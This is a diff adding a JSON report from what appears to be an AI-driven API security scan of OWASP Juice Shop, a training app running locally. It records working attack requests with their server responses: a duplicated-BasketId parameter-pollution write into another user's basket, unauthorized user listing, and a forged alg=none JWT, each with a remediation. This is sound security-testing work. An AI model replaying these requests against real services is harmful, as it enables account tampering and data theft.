@@ -1,0 +1,381 @@
+{
+  "target": "juiceshop",
+  "target_url": "http://localhost:3001",
+  "scan_id": "44b9b1f4-c2ab-4c23-b9c9-8ea369100c43",
+  "elapsed_seconds": 227.4,
+  "run_at": "2026-07-07T16:41:09.651739+00:00",
+  "events": [
+    {
+      "type": "progress",
+      "phase": "recon",
+      "message": "Starting reconnaissance on http://localhost:3001..."
+    },
+    {
+      "type": "progress",
+      "phase": "recon",
+      "message": "Recon complete. Found 50 endpoints, 96 ID patterns.",
+      "data": {
+        "endpoints_found": 50,
+        "id_patterns": 96,
+        "tech_stack": {
+          "app": "OWASP Juice Shop"
+        }
+      }
+    },
+    {
+      "type": "progress",
+      "phase": "hypothesis",
+      "message": "AI is analysing recon data to decide what to test..."
+    },
+    {
+      "type": "progress",
+      "phase": "hypothesis",
+      "message": "AI test plan ready. Running 5 module(s).",
+      "data": {
+        "test_plan": [
+          {
+            "module": "idor",
+            "priority": 1,
+            "reason": "Multiple IDOR candidates identified with numeric IDs (e.g., /api/users/3, /api/orders/1, /rest/basket/1, /api/Complaints/1) and user-specific endpoints.",
+            "endpoints": [
+              "/api/users/3",
+              "/api/orders/1",
+              "/rest/basket/1",
+              "/api/Complaints/1"
+            ],
+            "confidence": "HIGH"
+          },
+          {
+            "module": "bfla",
+            "priority": 1,
+            "reason": "Multiple admin and privileged endpoints detected (e.g., /api/admin, /api/admin/users, /administration, /workshop/api/shop/orders/all) that may lack proper authorization checks.",
+            "endpoints": [
+              "/api/admin",
+              "/api/admin/users",
+              "/api/admin/dashboard",
+              "/api/v1/admin",
+              "/administration",
+              "/workshop/api/shop/orders/all"
+            ],
+            "confidence": "HIGH"
+          },
+          {
+            "module": "broken_auth",
+            "priority": 2,
+            "reason": "Extensive authentication endpoints present (e.g., /api/auth/login, /api/auth/register, /api/auth/me, /rest/user/whoami) suggesting JWT or OAuth usage susceptible to attacks.",
+            "endpoints": [
+              "/api/auth/login",
+              "/api/auth/register",
+              "/api/auth/me",
+              "/rest/user/whoami",
+              "/api/auth/token"
+            ],
+            "confidence": "HIGH"
+          },
+          {
+            "module": "business_logic",
+            "priority": 3,
+            "reason": "Transaction-oriented endpoints (e.g., /api/order/create, /api/balance/add, /api/wallet/transfer, /api/coupon/apply) indicate a shopping/workflow system prone to logic flaws.",
+            "endpoints": [
+              "/api/order/create",
+              "/api/balance/add",
+              "/api/wallet/transfer",
+              "/api/coupon/apply",
+              "/api/checkout"
+            ],
+            "confidence": "MEDIUM"
+          },
+          {
+            "module": "ssrf",
+            "priority": 3,
+            "reason": "Endpoints like /workshop/api/merchant/contact_mechanic (known SSRF vector) and /api/images, /api/upload, /api/integrations may accept URLs or fetch resources, potential SSRF.",
+            "endpoints": [
+              "/workshop/api/merchant/contact_mechanic",
+              "/api/images",
+              "/api/upload",
+              "/api/integrations"
+            ],
+            "confidence": "MEDIUM"
+          }
+        ]
+      }
+    },
+    {
+      "type": "progress",
+      "phase": "testing",
+      "message": "Running IDOR tests...",
+      "data": {
+        "module": "idor",
+        "reason": "Multiple IDOR candidates identified with numeric IDs (e.g., /api/users/3, /api/orders/1, /rest/basket/1, /api/Complaints/1) and user-specific endpoints."
+      }
+    },
+    {
+      "type": "finding",
+      "vulnerability": "IDOR / Broken Object Level Authorization (BOLA) \u2014 Basket Manipulation (HTTP Parameter Pollution)",
+      "owasp": "A01:2025 \u2014 Broken Access Control",
+      "endpoint": "http://localhost:3001/api/BasketItems",
+      "severity": "high",
+      "needs_help": false,
+      "evidence": {
+        "attack": "HTTP Parameter Pollution: duplicated BasketId (attacker's own, then victim's) passes the ownership check on the first value but writes using the last",
+        "attacker_basket": "105",
+        "victim_basket": "104",
+        "control_request": {
+          "note": "single victim BasketId (no HPP) \u2014 correctly rejected",
+          "body": {
+            "ProductId": 1,
+            "BasketId": "104",
+            "quantity": 1
+          },
+          "status": 401,
+          "response": "{'error' : 'Invalid BasketId'}"
+        },
+        "attack_request": {
+          "method": "POST",
+          "url": "http://localhost:3001/api/BasketItems",
+          "raw_body": "{\"ProductId\": 1, \"BasketId\": \"105\", \"quantity\": 1, \"BasketId\": \"104\"}",
+          "headers": {
+            "Authorization": "Bearer <user_b_token>"
+          },
+          "status": 200,
+          "response": "{\"status\":\"success\",\"data\":{\"id\":49,\"ProductId\":1,\"BasketId\":\"104\",\"quantity\":1,\"updatedAt\":\"2026-07-07T16:37:54.186Z\",\"createdAt\":\"2026-07-07T16:37:54.186Z\"}}"
+        },
+        "verification": {
+          "victim_basket_before": [],
+          "victim_basket_after": [
+            1
+          ],
+          "product_written": 1
+        }
+      },
+      "ai_reasoning": "A single-BasketId write to the victim's basket was rejected (401), but the HPP payload with a duplicated BasketId succeeded (200) and product 1 appeared in the victim's basket (bid 104). The attacker (User B) modified another user's basket \u2192 IDOR / broken access control."
+    },
+    {
+      "type": "progress",
+      "phase": "testing",
+      "message": "IDOR complete \u2014 1 finding(s)."
+    },
+    {
+      "type": "progress",
+      "phase": "testing",
+      "message": "Running BFLA tests...",
+      "data": {
+        "module": "bfla",
+        "reason": "Multiple admin and privileged endpoints detected (e.g., /api/admin, /api/admin/users, /administration, /workshop/api/shop/orders/all) that may lack proper authorization checks."
+      }
+    },
+    {
+      "type": "finding",
+      "vulnerability": "Broken Function-Level Authorization (BFLA)",
+      "owasp": "A01:2025 \u2014 Broken Access Control",
+      "endpoint": "http://localhost:3001/api/users",
+      "severity": "high",
+      "needs_help": false,
+      "evidence": {
+        "request": {
+          "method": "GET",
+          "url": "http://localhost:3001/api/users",
+          "caller": "normal-user",
+          "authenticated": true,
+          "headers": {
+            "Authorization": "Bearer <normal-user-token>"
+          }
+        },
+        "response": {
+          "status": 200,
+          "body": "{\"status\":\"success\",\"data\":[{\"id\":1,\"username\":\"\",\"email\":\"admin@juice-sh.op\",\"role\":\"admin\",\"deluxeToken\":\"\",\"lastLoginIp\":\"\",\"profileImage\":\"assets/public/images/uploads/defaultAdmin.png\",\"isActive\":true,\"createdAt\":\"2026-07-05T19:13:34.351Z\",\"updatedAt\":\"2026-07-05T19:13:34.351Z\",\"deletedAt\":null},{\"id\":2,\"username\":\"\",\"email\":\"jim@juice-sh.op\",\"role\":\"customer\",\"deluxeToken\":\"\",\"lastLoginIp\":\"\",\"profileImage\":\"assets/public/images/uploads/default.svg\",\"isActive\":true,\"createdAt\":\"2026-07-05T19:13:34.351Z\",\"updatedAt\":\"2026-07-05T19:13:34.351Z\",\"deletedAt\":null},{\"id\":3,\"username\":\"\",\"email"
+        }
+      },
+      "ai_reasoning": "A normal user successfully listed all users (including admin accounts and sensitive fields) via GET /api/users, which is a privileged endpoint that should require admin privileges, but returned HTTP 200 instead of 401/403."
+    },
+    {
+      "type": "progress",
+      "phase": "testing",
+      "message": "BFLA complete \u2014 1 finding(s)."
+    },
+    {
+      "type": "progress",
+      "phase": "testing",
+      "message": "Running BROKEN_AUTH tests...",
+      "data": {
+        "module": "broken_auth",
+        "reason": "Extensive authentication endpoints present (e.g., /api/auth/login, /api/auth/register, /api/auth/me, /rest/user/whoami) suggesting JWT or OAuth usage susceptible to attacks."
+      }
+    },
+    {
+      "type": "finding",
+      "vulnerability": "Broken Auth \u2014 JWT Algorithm None Attack",
+      "owasp": "A07:2025 \u2014 Identification and Authentication Failures",
+      "endpoint": "http://localhost:3001/api/Users/1",
+      "severity": "critical",
+      "needs_help": false,
+      "evidence": {
+        "attack": "alg=none",
+        "forged_header": {
+          "alg": "none",
+          "typ": "JWT"
+        },
+        "request": {
+          "url": "http://localhost:3001/api/Users/1",
+          "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdGF0dXMiOiJzdWNjZXNz..."
+        },
+        "response": {
+          "status": 200,
+          "body": "{\"status\":\"success\",\"data\":{\"id\":1,\"username\":\"\",\"email\":\"admin@juice-sh.op\",\"role\":\"admin\",\"deluxeToken\":\"\",\"lastLoginIp\":\"\",\"profileImage\":\"assets/public/images/uploads/defaultAdmin.png\",\"isActive\":true,\"createdAt\":\"2026-07-05T19:13:34.351Z\",\"updatedAt\":\"2026-07-05T19:13:34.351Z\",\"deletedAt\":null}"
+        }
+      },
+      "ai_reasoning": "The server accepted a JWT with algorithm 'none' and returned protected user data, indicating a failure to enforce signature validation."
+    },
+    {
+      "type": "progress",
+      "phase": "testing",
+      "message": "BROKEN_AUTH complete \u2014 1 finding(s)."
+    },
+    {
+      "type": "progress",
+      "phase": "testing",
+      "message": "Running BUSINESS_LOGIC tests...",
+      "data": {
+        "module": "business_logic",
+        "reason": "Transaction-oriented endpoints (e.g., /api/order/create, /api/balance/add, /api/wallet/transfer, /api/coupon/apply) indicate a shopping/workflow system prone to logic flaws."
+      }
+    },
+    {
+      "type": "progress",
+      "phase": "testing",
+      "message": "BUSINESS_LOGIC complete \u2014 0 finding(s)."
+    },
+    {
+      "type": "progress",
+      "phase": "testing",
+      "message": "Running SSRF tests...",
+      "data": {
+        "module": "ssrf",
+        "reason": "Endpoints like /workshop/api/merchant/contact_mechanic (known SSRF vector) and /api/images, /api/upload, /api/integrations may accept URLs or fetch resources, potential SSRF."
+      }
+    },
+    {
+      "type": "progress",
+      "phase": "testing",
+      "message": "SSRF complete \u2014 0 finding(s)."
+    },
+    {
+      "type": "progress",
+      "phase": "report",
+      "message": "AI is generating the final report..."
+    },
+    {
+      "type": "complete",
+      "message": "Scan complete.",
+      "summary": {
+        "total_findings": 3,
+        "critical": 1,
+        "high": 2,
+        "medium": 0
+      }
+    }
+  ],
+  "final_report": {
+    "target": "http://localhost:3001",
+    "tech_stack": {
+      "app": "OWASP Juice Shop"
+    },
+    "total_findings": 3,
+    "critical": 1,
+    "high": 2,
+    "medium": 0,
+    "low": 0,
+    "executive_summary": "Your server is critically vulnerable to a JWT algorithm none attack at /api/Users/1, allowing unauthorized access with forged tokens. High-severity issues include IDOR via HTTP parameter pollution on /api/BasketItems and broken function-level authorization on /api/users, which expose sensitive data and functionality. Immediately disable the none algorithm in JWT validation, enforce strict authorization checks for all API endpoints, and sanitize all user inputs to mitigate these risks.",
+    "findings": [
+      {
+        "vulnerability": "IDOR / Broken Object Level Authorization (BOLA) \u2014 Basket Manipulation (HTTP Parameter Pollution)",
+        "owasp": "A01:2025 \u2014 Broken Access Control",
+        "endpoint": "http://localhost:3001/api/BasketItems",
+        "severity": "high",
+        "needs_help": false,
+        "evidence": {
+          "attack": "HTTP Parameter Pollution: duplicated BasketId (attacker's own, then victim's) passes the ownership check on the first value but writes using the last",
+          "attacker_basket": "105",
+          "victim_basket": "104",
+          "control_request": {
+            "note": "single victim BasketId (no HPP) \u2014 correctly rejected",
+            "body": {
+              "ProductId": 1,
+              "BasketId": "104",
+              "quantity": 1
+            },
+            "status": 401,
+            "response": "{'error' : 'Invalid BasketId'}"
+          },
+          "attack_request": {
+            "method": "POST",
+            "url": "http://localhost:3001/api/BasketItems",
+            "raw_body": "{\"ProductId\": 1, \"BasketId\": \"105\", \"quantity\": 1, \"BasketId\": \"104\"}",
+            "headers": {
+              "Authorization": "Bearer <user_b_token>"
+            },
+            "status": 200,
+            "response": "{\"status\":\"success\",\"data\":{\"id\":49,\"ProductId\":1,\"BasketId\":\"104\",\"quantity\":1,\"updatedAt\":\"2026-07-07T16:37:54.186Z\",\"createdAt\":\"2026-07-07T16:37:54.186Z\"}}"
+          },
+          "verification": {
+            "victim_basket_before": [],
+            "victim_basket_after": [
+              1
+            ],
+            "product_written": 1
+          }
+        },
+        "ai_reasoning": "A single-BasketId write to the victim's basket was rejected (401), but the HPP payload with a duplicated BasketId succeeded (200) and product 1 appeared in the victim's basket (bid 104). The attacker (User B) modified another user's basket \u2192 IDOR / broken access control.",
+        "remediation": "Implement a check in the POST /api/BasketItems endpoint that verifies BasketId is a single string value and not an array by rejecting requests with multiple BasketId parameters (e.g., if Array.isArray(req.body.BasketId) return 400). This ensures that the same BasketId value is used for both the ownership validation and the database write, preventing HTTP Parameter Pollution attacks."
+      },
+      {
+        "vulnerability": "Broken Function-Level Authorization (BFLA)",
+        "owasp": "A01:2025 \u2014 Broken Access Control",
+        "endpoint": "http://localhost:3001/api/users",
+        "severity": "high",
+        "needs_help": false,
+        "evidence": {
+          "request": {
+            "method": "GET",
+            "url": "http://localhost:3001/api/users",
+            "caller": "normal-user",
+            "authenticated": true,
+            "headers": {
+              "Authorization": "Bearer <normal-user-token>"
+            }
+          },
+          "response": {
+            "status": 200,
+            "body": "{\"status\":\"success\",\"data\":[{\"id\":1,\"username\":\"\",\"email\":\"admin@juice-sh.op\",\"role\":\"admin\",\"deluxeToken\":\"\",\"lastLoginIp\":\"\",\"profileImage\":\"assets/public/images/uploads/defaultAdmin.png\",\"isActive\":true,\"createdAt\":\"2026-07-05T19:13:34.351Z\",\"updatedAt\":\"2026-07-05T19:13:34.351Z\",\"deletedAt\":null},{\"id\":2,\"username\":\"\",\"email\":\"jim@juice-sh.op\",\"role\":\"customer\",\"deluxeToken\":\"\",\"lastLoginIp\":\"\",\"profileImage\":\"assets/public/images/uploads/default.svg\",\"isActive\":true,\"createdAt\":\"2026-07-05T19:13:34.351Z\",\"updatedAt\":\"2026-07-05T19:13:34.351Z\",\"deletedAt\":null},{\"id\":3,\"username\":\"\",\"email"
+          }
+        },
+        "ai_reasoning": "A normal user successfully listed all users (including admin accounts and sensitive fields) via GET /api/users, which is a privileged endpoint that should require admin privileges, but returned HTTP 200 instead of 401/403.",
+        "remediation": "In the Express.js route handler for GET /api/users, add an authorization middleware that checks if the authenticated user's role is 'admin' before calling the controller function, ensuring only admin users can list all users."
+      },
+      {
+        "vulnerability": "Broken Auth \u2014 JWT Algorithm None Attack",
+        "owasp": "A07:2025 \u2014 Identification and Authentication Failures",
+        "endpoint": "http://localhost:3001/api/Users/1",
+        "severity": "critical",
+        "needs_help": false,
+        "evidence": {
+          "attack": "alg=none",
+          "forged_header": {
+            "alg": "none",
+            "typ": "JWT"
+          },
+          "request": {
+            "url": "http://localhost:3001/api/Users/1",
+            "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdGF0dXMiOiJzdWNjZXNz..."
+          },
+          "response": {
+            "status": 200,
+            "body": "{\"status\":\"success\",\"data\":{\"id\":1,\"username\":\"\",\"email\":\"admin@juice-sh.op\",\"role\":\"admin\",\"deluxeToken\":\"\",\"lastLoginIp\":\"\",\"profileImage\":\"assets/public/images/uploads/defaultAdmin.png\",\"isActive\":true,\"createdAt\":\"2026-07-05T19:13:34.351Z\",\"updatedAt\":\"2026-07-05T19:13:34.351Z\",\"deletedAt\":null}"
+          }
+        },
+        "ai_reasoning": "The server accepted a JWT with algorithm 'none' and returned protected user data, indicating a failure to enforce signature validation.",
+        "remediation": "In your JWT verification middleware using the `jsonwebtoken` library, explicitly enforce allowed algorithms by passing an `algorithms` array to `jwt.verify` that only includes strong options like `HS256` and excludes `none`, preventing acceptance of tokens with unsigned algorithms. This directly mitigates the algorithm none attack by requiring a valid signature for every token processed."
+      }
+    ]
+  }
+}
